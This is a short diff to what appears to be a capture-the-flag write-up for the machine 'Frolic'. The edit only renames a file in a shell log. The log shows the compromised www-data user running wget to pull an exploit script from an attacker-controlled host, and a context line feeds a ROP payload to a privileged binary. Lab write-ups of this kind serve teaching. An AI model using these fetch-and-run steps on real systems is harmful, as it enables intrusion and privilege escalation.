@@ -663,8 +663,8 @@ subprocess.call(["/home/ayush/.binary/rop", payload])
 
 
 ```
-www-data@frolic:~/html$ wget 10.10.14.70:8000/explotest.py
---2021-02-04 09:16:47--  http://10.10.14.70:8000/explotest.py
+www-data@frolic:~/html$ wget 10.10.14.70:8000/exploit.py
+--2021-02-04 09:16:47--  http://10.10.14.70:8000/exploit.py
 Connecting to 10.10.14.70:8000... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 397 [text/plain]
